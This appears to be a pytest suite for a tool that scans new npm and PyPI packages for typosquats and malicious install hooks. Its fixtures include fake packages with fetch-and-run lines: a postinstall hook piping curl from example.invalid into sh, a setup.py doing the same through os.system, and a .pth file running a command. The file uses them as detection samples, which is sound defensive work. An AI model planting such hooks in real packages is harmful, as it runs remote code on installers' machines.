"""End-to-end scan runs against mocked registries."""

import json
import xmlrpc.client
from datetime import timedelta

import httpx
import pytest
import respx

from pkgwatch import scan
from pkgwatch.fixtures import DEFAULT_DIR
from pkgwatch.output.json_out import RunCounts
from pkgwatch.sources import npm, pypi
from pkgwatch.util import iso, read_json, utcnow
from tests.helpers import make_tgz, make_zip

FILES = "https://files.pythonhosted.org/packages/aa/bb"
REPO_API = "https://api.github.com/repos/abidranesh/typosquat_-_mal_package_tracker"
BASELINES = str(DEFAULT_DIR / "baselines")


def stamp(hours_ago=1.0):
    return iso(utcnow() - timedelta(hours=hours_ago)).replace("Z", ".000Z")


def npm_packument(name, version="1.0.0", scripts=None, created_hours=2, **manifest):
    return {
        "name": name,
        "description": "utilities for everyone",
        "readme": "Documentation. " * 10,
        "time": {"created": stamp(created_hours), version: stamp(1)},
        "versions": {
            version: {
                "name": name,
                "version": version,
                "scripts": scripts or {},
                "repository": {"url": f"https://github.com/example-org/{name}"},
                "maintainers": [{"name": "someone"}],
                "_npmUser": {"name": "someone"},
                "dist": {
                    "tarball": f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz",
                    "unpackedSize": 100,
                },
                **manifest,
            }
        },
    }


def pypi_project(name, version="1.0.0", setup="from setuptools import setup\nsetup()\n"):
    return {
        "info": {
            "name": name,
            "version": version,
            "summary": "A documented library",
            "description": "Long description. " * 10,
            "project_urls": {"Source": f"https://github.com/example-org/{name}"},
        },
        "ownership": {"roles": [{"role": "Owner", "user": "someone"}]},
        "releases": {
            version: [
                {
                    "filename": f"{name}-{version}.tar.gz",
                    "packagetype": "sdist",
                    "size": 500,
                    "url": f"{FILES}/{name}-{version}.tar.gz",
                    "upload_time_iso_8601": stamp(1),
                }
            ]
        },
    }


def xmlrpc_response(value):
    return httpx.Response(
        200, content=xmlrpc.client.dumps((value,), methodresponse=True, allow_none=True).encode()
    )


class Registry:
    """Mocks both registries with a small, fixed set of new packages."""

    def __init__(self, mock, head_seq=1000, head_serial=5000):
        self.mock = mock
        self.changes = [
            {"seq": 101, "id": "lodahs"},
            {"seq": 102, "id": "plain-utility"},
            {"seq": 103, "id": "removed-pkg", "deleted": True},
            {"seq": 104, "id": "vanished"},
            {"seq": 105, "id": "old-metadata-edit"},
        ]
        self.rows = [
            ["reqeusts", "1.0.0", 1794734716, "add source file reqeusts-1.0.0.tar.gz", 4001],
            ["reqeusts", "1.0.0", 1794734717, "add py3 file reqeusts-1.0.0-py3-none-any.whl", 4002],
            ["tidy-lib", "1.0.0", 1794734718, "new release", 4003],
        ]
        mock.get(npm.REPLICATE_ROOT).respond(json={"update_seq": head_seq})
        self.changes_route = mock.get(npm.CHANGES_URL).mock(side_effect=self._changes)
        mock.get(npm.SEARCH_URL).respond(json={"total": 1})
        mock.get("https://registry.npmjs.org/lodahs").respond(
            json=npm_packument(
                "lodahs", scripts={"postinstall": "curl -s https://example.invalid/i.sh | sh"}
            )
        )
        mock.get("https://registry.npmjs.org/plain-utility").respond(
            json=npm_packument("plain-utility")
        )
        mock.get("https://registry.npmjs.org/vanished").respond(404)
        old = npm_packument("old-metadata-edit")
        old["time"] = {"created": "2019-01-01T00:00:00.000Z", "1.0.0": "2019-01-01T00:00:00.000Z"}
        mock.get("https://registry.npmjs.org/old-metadata-edit").respond(json=old)
        for name in ("lodahs", "plain-utility"):
            mock.get(f"https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz").respond(
                content=make_tgz({"package/index.js": "module.exports = 1;\n"})
            )
        self.head_serial = head_serial
        self.xmlrpc_route = mock.post(pypi.XMLRPC_URL).mock(side_effect=self._xmlrpc)
        evil_setup = "import os\nfrom setuptools import setup\nos.system('curl https://example.invalid/x | sh')\nsetup()\n"
        mock.get("https://pypi.org/pypi/reqeusts/json").respond(json=pypi_project("reqeusts"))
        mock.get("https://pypi.org/pypi/tidy-lib/json").respond(json=pypi_project("tidy-lib"))
        mock.get(f"{FILES}/reqeusts-1.0.0.tar.gz").respond(
            content=make_tgz({"reqeusts-1.0.0/setup.py": evil_setup})
        )
        mock.get(f"{FILES}/tidy-lib-1.0.0.tar.gz").respond(
            content=make_tgz({"tidy-lib-1.0.0/setup.py": "from setuptools import setup\nsetup()\n"})
        )

    def _changes(self, request):
        params = request.url.params
        if params.get("descending") == "true":
            rows = sorted(self.changes, key=lambda r: -r["seq"])[: int(params["limit"])]
            return httpx.Response(200, json={"results": rows, "last_seq": rows[-1]["seq"]})
        rows = [r for r in self.changes if r["seq"] > int(params["since"])][: int(params["limit"])]
        last = rows[-1]["seq"] if rows else int(params["since"])
        return httpx.Response(200, json={"results": rows, "last_seq": last})

    def _xmlrpc(self, request):
        (params, method) = xmlrpc.client.loads(request.content)
        if method == "changelog_last_serial":
            return xmlrpc_response(self.head_serial)
        return xmlrpc_response([r for r in self.rows if r[4] > params[0]])


@pytest.fixture
def dirs(tmp_path):
    return {
        "docs": tmp_path / "docs",
        "reports": tmp_path / "reports",
        "state": tmp_path / "state" / "cursors.json",
    }


def args_for(dirs, *extra):
    return scan.build_parser().parse_args(
        [
            "--output-dir",
            str(dirs["docs"]),
            "--reports-dir",
            str(dirs["reports"]),
            "--state",
            str(dirs["state"]),
            "--baselines",
            BASELINES,
            *extra,
        ]  # fmt: skip
    )


def seed_state(dirs, seq=100, serial=4000):
    dirs["state"].parent.mkdir(parents=True, exist_ok=True)
    dirs["state"].write_text(
        json.dumps({"npm": {"seq": seq}, "pypi": {"serial": serial}}), encoding="utf-8"
    )


def test_full_run_writes_outputs_advances_cursors_and_opens_no_issue_without_token(
    dirs, client, capsys, monkeypatch
):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        assert scan.run(args_for(dirs), client=client) == 0

    latest = read_json(dirs["docs"] / "data" / "latest.json")["findings"]
    by_key = {r["key"]: r for r in latest}
    assert set(by_key) == {"npm/lodahs/1.0.0", "pypi/reqeusts/1.0.0"}
    lodahs = by_key["npm/lodahs/1.0.0"]
    assert lodahs["severity"] == "high" and lodahs["targets"] == ["lodash"]
    assert {f["id"] for f in lodahs["findings"]} == {
        "typosquat",
        "new-publisher-similar-name",
        "npm-install-hook",
    }
    reqeusts = by_key["pypi/reqeusts/1.0.0"]
    assert {"typosquat", "python-install-code", "binary-dropper"} <= {
        f["id"] for f in reqeusts["findings"]
    }

    stats = read_json(dirs["docs"] / "data" / "stats.json")
    assert stats["totals"]["by_ecosystem"]["npm"] == {"scanned": 2, "flagged": 1, "high": 1}
    assert stats["totals"]["by_ecosystem"]["pypi"]["scanned"] == 2
    health = read_json(dirs["docs"] / "data" / "health.json")
    assert health["status"] == "ok" and health["scanned"] == 4 and health["package_errors"] == 0
    assert health["skipped"] == {"gone": 1, "no-recent-version": 1}
    day = lodahs["published_at"][:10]
    assert read_json(dirs["docs"] / "data" / "findings" / "index.json")["days"][day] == 2
    assert (dirs["docs"] / "feed.xml").exists() and (dirs["docs"] / "feed-high.xml").exists()
    assert (dirs["reports"] / "npm" / "lodahs-1.0.0.md").exists()

    state = read_json(dirs["state"])
    assert state["npm"]["seq"] == 105 and state["pypi"]["serial"] == 4003
    assert len(state["recent"]) == 4 and state["issue_backlog"] == []
    out = capsys.readouterr().out
    assert "npm/lodahs@1.0.0" in out and "package errors: 0" in out

    # Nothing about the unflagged packages was written anywhere.
    everything = "".join(
        p.read_text(encoding="utf-8") for p in dirs["docs"].rglob("*") if p.is_file()
    )
    assert "plain-utility" not in everything and "tidy-lib" not in everything


def test_second_run_is_idempotent(dirs, client, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        registry = Registry(mock)
        scan.run(args_for(dirs), client=client)
        before = (dirs["docs"] / "data" / "latest.json").read_bytes()
        # The same packages show up again (e.g. a dist-tag edit bumps the sequence).
        registry.changes.append({"seq": 110, "id": "lodahs"})
        registry.rows.append(["reqeusts", "1.0.0", 1794734999, "add py3 file again.whl", 4010])
        assert scan.run(args_for(dirs), client=client) == 0
    assert (dirs["docs"] / "data" / "latest.json").read_bytes() == before
    stats = read_json(dirs["docs"] / "data" / "stats.json")
    assert stats["totals"]["scanned"] == 4 and stats["totals"]["flagged"] == 2  # not double-counted
    state = read_json(dirs["state"])
    assert state["npm"]["seq"] == 110 and state["pypi"]["serial"] == 4010
    assert read_json(dirs["docs"] / "data" / "health.json")["skipped"] == {"already-scanned": 2}


def test_cold_start_uses_latest_changes_and_rss(dirs, client, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    rss_updates = (
        b'<rss version="2.0"><channel><item><link>https://pypi.org/project/reqeusts/1.0.0/</link></item>'
        b"<item><link>https://pypi.org/project/reqeusts/1.0.0/</link></item></channel></rss>"
    )
    rss_new = b'<rss version="2.0"><channel><item><link>https://pypi.org/project/tidy-lib/</link></item></channel></rss>'
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.get(pypi.RSS_UPDATES).respond(content=rss_updates, headers={"ETag": "u1"})
        mock.get(pypi.RSS_NEW).respond(content=rss_new)
        assert scan.run(args_for(dirs, "--limit", "40"), client=client) == 0
    state = read_json(dirs["state"])
    assert state["npm"]["seq"] == 105
    assert state["pypi"]["serial"] == 5000  # head serial at start-up, so nothing is skipped later
    assert state["pypi"]["etags"] == {pypi.RSS_UPDATES: "u1"}
    assert read_json(dirs["docs"] / "data" / "stats.json")["totals"]["scanned"] == 4


def test_dry_run_ignores_and_preserves_state_and_never_opens_issues(dirs, client, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "should-not-be-used")
    seed_state(dirs, seq=100, serial=4000)
    original = dirs["state"].read_bytes()
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.get(pypi.RSS_UPDATES).respond(content=b"<rss><channel></channel></rss>")
        mock.get(pypi.RSS_NEW).respond(content=b"<rss><channel></channel></rss>")
        github = mock.route(host="api.github.com").respond(500)
        assert scan.run(args_for(dirs, "--dry-run", "--ecosystem", "npm"), client=client) == 0
        assert not github.called
    assert dirs["state"].read_bytes() == original
    assert (
        read_json(dirs["docs"] / "data" / "stats.json")["totals"]["by_ecosystem"]["pypi"]["scanned"]
        == 0
    )
    assert (dirs["reports"] / "npm" / "lodahs-1.0.0.md").exists()


def test_high_findings_open_triage_issues_once(dirs, client, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "t")
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.post(f"{REPO_API}/labels").respond(422)
        search = mock.get("https://api.github.com/search/issues").respond(json={"items": []})
        create = mock.post(f"{REPO_API}/issues").respond(
            201, json={"html_url": "https://github.com/i/1"}
        )
        assert scan.run(args_for(dirs), client=client) == 0
        titles = sorted(json.loads(c.request.content)["title"] for c in create.calls)
        assert titles == [
            "[PkgWatch] Suspicious package: npm/lodahs@1.0.0",
            "[PkgWatch] Suspicious package: pypi/reqeusts@1.0.0",
        ]
        assert scan.run(args_for(dirs), client=client) == 0
        assert create.call_count == 2 and search.call_count == 2  # nothing new, nothing re-opened
        assert scan.run(args_for(dirs, "--no-issues"), client=client) == 0


def test_issue_backlog_is_retried_next_run(dirs, client, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "t")
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.post(f"{REPO_API}/labels").respond(422)
        mock.get("https://api.github.com/search/issues").respond(json={"items": []})
        create = mock.post(f"{REPO_API}/issues").respond(403)
        assert scan.run(args_for(dirs), client=client) == 0  # an issue failure never fails the scan
        assert len(read_json(dirs["state"])["issue_backlog"]) == 2
        assert (
            "issue creation stopped"
            in read_json(dirs["docs"] / "data" / "health.json")["warnings"][0]
        )
        create.respond(201, json={"html_url": "u"})
        assert scan.run(args_for(dirs), client=client) == 0
        assert read_json(dirs["state"])["issue_backlog"] == []
        assert create.call_count == 3


def test_source_failure_is_fatal_but_keeps_the_other_ecosystem(dirs, client, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    summary = dirs["docs"].parent / "summary.md"
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.get(npm.REPLICATE_ROOT).respond(500)
        assert scan.run(args_for(dirs), client=client) == 1
    assert "FATAL: npm source failed" in capsys.readouterr().err
    assert "FATAL: npm source failed" in summary.read_text(encoding="utf-8")
    assert not (dirs["docs"] / "data" / "health.json").exists()  # the badge will go stale
    state = read_json(dirs["state"])
    assert state["npm"]["seq"] == 100 and state["pypi"]["serial"] == 4003
    keys = {r["key"] for r in read_json(dirs["docs"] / "data" / "latest.json")["findings"]}
    assert keys == {"pypi/reqeusts/1.0.0"}


def test_many_package_errors_fail_the_run(dirs, client, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    seed_state(dirs)
    with respx.mock(assert_all_called=False) as mock:
        registry = Registry(mock)
        registry.changes = [{"seq": 200 + i, "id": f"broken-{i}"} for i in range(12)]
        mock.get(url__regex=r"https://registry\.npmjs\.org/broken-\d+").respond(403)
        assert scan.run(args_for(dirs, "--ecosystem", "npm"), client=client) == 1
    assert read_json(dirs["state"])["npm"]["seq"] == 211  # progress is kept, the run is still red


def test_pypi_falls_back_to_rss_when_changelog_api_fails(dirs, client, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    seed_state(dirs)
    rss_updates = b"<rss><channel><item><link>https://pypi.org/project/reqeusts/1.0.0/</link></item></channel></rss>"
    with respx.mock(assert_all_called=False) as mock:
        Registry(mock)
        mock.post(pypi.XMLRPC_URL).respond(500)
        mock.get(pypi.RSS_UPDATES).respond(content=rss_updates)
        mock.get(pypi.RSS_NEW).respond(content=b"<rss><channel></channel></rss>")
        assert scan.run(args_for(dirs, "--ecosystem", "pypi"), client=client) == 0
    health = read_json(dirs["docs"] / "data" / "health.json")
    assert "used RSS feeds instead" in health["warnings"][0] and health["scanned"] == 1
    assert read_json(dirs["state"])["pypi"]["serial"] == 4000  # unchanged until the API is back


# ---------------------------------------------------------------- planning and job running


@respx.mock
def test_plan_npm_dedupes_drops_deleted_and_skips_ahead_on_huge_backlog(client):
    respx.get(npm.REPLICATE_ROOT).respond(json={"update_seq": 1_000_000})
    route = respx.get(npm.CHANGES_URL).respond(
        json={
            "results": [
                {"seq": 600_001, "id": "a"},
                {"seq": 600_002, "id": "b"},
                {"seq": 600_003, "id": "a"},
                {"seq": 600_004, "id": "c", "deleted": True},
            ],
            "last_seq": 600_004,
        }
    )
    counts = RunCounts()
    jobs, final = scan.plan_npm(client, 10, 500, counts)
    assert [(j.name, j.cursor) for j in jobs] == [("b", 600_002), ("a", 600_003)]
    assert final == 600_004
    assert route.calls.last.request.url.params["since"] == str(1_000_000 - scan.NPM_MAX_BACKLOG)
    assert "skipped ahead" in counts.warnings[0]


@respx.mock
def test_plan_pypi_caps_jobs_and_skips_ahead(client):
    rows = [[f"p{i}", "1.0", 1794734716, "new release", 100_000 + i] for i in range(10)]

    def handler(request):
        params, method = xmlrpc.client.loads(request.content)
        return xmlrpc_response(200_000 if method == "changelog_last_serial" else rows)

    respx.post(pypi.XMLRPC_URL).mock(side_effect=handler)
    counts = RunCounts()
    state = {"serial": 5}
    jobs, final = scan.plan_pypi(client, state, 4, counts)
    assert [j.name for j in jobs] == ["p0", "p1", "p2", "p3"] and final is None
    assert "skipped ahead" in counts.warnings[0]
    jobs, final = scan.plan_pypi(client, {"serial": 199_990}, 50, RunCounts())
    assert len(jobs) == 10 and final == 199_990


def test_run_jobs_respects_deadline_and_cursor_follows_completed_work(config, baselines):
    class FakeScanner:
        def __init__(self):
            self.config = config

        def scan(self, job):
            return scan.Outcome(ecosystem="npm", scanned=True)

    jobs = [scan.Job("npm", f"p{i}", None, 100 + i) for i in range(100)]
    ticks = iter([0, 0, 99, 99, 99])
    counts = RunCounts()
    records, done = scan.run_jobs(
        FakeScanner(), jobs, counts, deadline=10, clock=lambda: next(ticks)
    )
    assert records == [] and done == 64 and counts.scanned["npm"] == 64
    assert "36 package(s) carried over" in counts.warnings[0]
    assert scan._cursor_after(jobs, done, 999, 50) == 163  # last completed job, not the feed head
    assert scan._cursor_after(jobs, 100, 999, 50) == 999
    assert scan._cursor_after(jobs, 0, 999, 50) == 50
    assert scan._cursor_after(jobs, 100, None, 50) == 199


def test_scanner_isolates_errors_and_oversized_metadata(client, config, baselines):
    scanner = scan.Scanner(client, config, baselines, scan.Recent(), utcnow())
    with respx.mock(assert_all_called=False) as mock:
        mock.get("https://registry.npmjs.org/huge").respond(200, content=b"x" * (26 * 1024 * 1024))
        assert scanner.scan(scan.Job("npm", "huge", None, 1)).skipped == "metadata-too-large"
        mock.get("https://registry.npmjs.org/weird").respond(
            json={"versions": {"1.0.0": None}, "time": {"1.0.0": stamp()}}
        )
        outcome = scanner.scan(scan.Job("npm", "weird", None, 2))
        assert outcome.error.startswith("npm/weird: ") and not outcome.scanned
        mock.get("https://pypi.org/pypi/empty/json").respond(
            json={"info": {"name": "empty"}, "releases": {}}
        )
        assert scanner.scan(scan.Job("pypi", "empty", None, 3)).skipped == "no-files"
        mock.get("https://pypi.org/pypi/nofile/json").respond(
            json={"info": {"name": "nofile"}, "releases": {"1.0": []}}
        )
        mock.get("https://pypi.org/pypi/nofile/1.0/json").respond(404)
        assert scanner.scan(scan.Job("pypi", "nofile", "1.0", 4)).skipped == "no-files"
        mock.get("https://pypi.org/pypi/missing/json").respond(404)
        assert scanner.scan(scan.Job("pypi", "missing", "1.0", 5)).skipped == "gone"


def test_recent_set_is_bounded_and_thread_safe_enough():
    recent = scan.Recent(["aaaaaaaaaa"])
    assert recent.claim("npm/a/1.0.0") and not recent.claim("npm/a/1.0.0")
    for i in range(scan.RECENT_MAX + 50):
        recent.claim(f"npm/p{i}/1.0.0")
    dumped = recent.dump()
    assert len(dumped) == scan.RECENT_MAX and all(len(h) == 10 for h in dumped)
    assert scan.short_hash("x") == scan.short_hash("x") != scan.short_hash("y")


def test_wheel_only_release_is_scanned(dirs, client, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    seed_state(dirs)
    project = pypi_project("tidy-lib")
    project["releases"]["1.0.0"] = [
        {
            "filename": "tidy_lib-1.0.0-py3-none-any.whl",
            "packagetype": "bdist_wheel",
            "size": 300,
            "url": f"{FILES}/tidy_lib-1.0.0-py3-none-any.whl",
            "upload_time_iso_8601": stamp(1),
        }
    ]
    with respx.mock(assert_all_called=False) as mock:
        registry = Registry(mock)
        registry.rows = [["tidy-lib", "1.0.0", 1794734718, "new release", 4003]]
        mock.get("https://pypi.org/pypi/tidy-lib/json").respond(json=project)
        mock.get(f"{FILES}/tidy_lib-1.0.0-py3-none-any.whl").respond(
            content=make_zip(
                {"tidy_lib/__init__.py": "X = 1\n", "tidy.pth": "import os; os.system('id')\n"}
            )
        )
        assert scan.run(args_for(dirs, "--ecosystem", "pypi"), client=client) == 0
    (found,) = read_json(dirs["docs"] / "data" / "latest.json")["findings"]
    assert (
        found["key"] == "pypi/tidy-lib/1.0.0"
        and found["findings"][0]["id"] == "python-install-code"
    )


def test_cli_parser_defaults():
    args = scan.build_parser().parse_args([])
    assert not args.dry_run and args.ecosystem == "all" and args.limit is None
    args = scan.build_parser().parse_args(["--dry-run", "--limit", "50"])
    assert args.dry_run and args.limit == 50
